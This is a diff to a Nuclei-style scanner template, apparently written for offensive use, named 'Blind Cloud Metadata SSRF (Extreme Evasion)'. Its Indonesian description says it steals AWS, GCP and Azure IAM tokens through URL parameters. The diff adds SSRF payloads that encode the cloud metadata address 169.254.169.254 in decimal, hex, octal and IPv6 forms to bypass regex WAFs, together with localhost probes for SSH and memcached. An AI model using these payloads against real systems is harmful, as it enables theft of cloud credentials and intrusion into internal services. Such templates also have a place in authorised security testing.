@@ -1,20 +1,24 @@
 id: ghost-ssrf-cloud-bypass
 
 info:
-  name: Blind Cloud Metadata SSRF (WAF Bypass)
+  name: Blind Cloud Metadata SSRF (Extreme Evasion)
   author: Sniper-Predator
   severity: critical
-  description: Mencuri token IAM AWS/GCP/Azure melalui parameter URL.
-  tags: ssrf,cloud,aws,gcp,azure,custom
+  description: Mencuri token IAM AWS/GCP/Azure melalui parameter URL dengan IP Obfuscation.
+  tags: ssrf,cloud,aws,gcp,azure,bypass,custom
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/?url=http://2852039166/latest/meta-data/iam/security-credentials/"
-      - "{{BaseURL}}/?endpoint=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/"
-      - "{{BaseURL}}/?proxy=http://[::ffff:169.254.169.254]/latest/meta-data/"
-      - "{{BaseURL}}/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
-      - "{{BaseURL}}/?webhook=http://169.254.169.254/latest/dynamic/instance-identity/document"
+      # AWS IP Obfuscation (Bypass Regex WAF)
+      - "{{BaseURL}}/?url=http://2852039166/latest/meta-data/iam/security-credentials/" # Decimal
+      - "{{BaseURL}}/?endpoint=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/" # Hex
+      - "{{BaseURL}}/?proxy=http://0251.0376.0251.0376/latest/meta-data/" # Octal
+      - "{{BaseURL}}/?webhook=http://[::ffff:169.254.169.254]/latest/meta-data/" # IPv6
+      # Localhost Bypasses (Docker/K8s SSRF)
+      - "{{BaseURL}}/?url=http://0.0.0.0:8080"
+      - "{{BaseURL}}/?url=http://127.1:22"
+      - "{{BaseURL}}/?url=dict://127.0.0.1:11211/"
 
     headers:
       Metadata-Flavor: "Google"
@@ -31,8 +35,9 @@ requests:
           - "instance-id"
           - "computeMetadata"
           - "metadata-flavor"
+          - "OpenSSH"
         condition: or
-      # ANTI-HTML TRAP: Membuang False Positive dari website biasa
+      # ANTI-HTML TRAP
       - type: word
         words:
           - "<html"
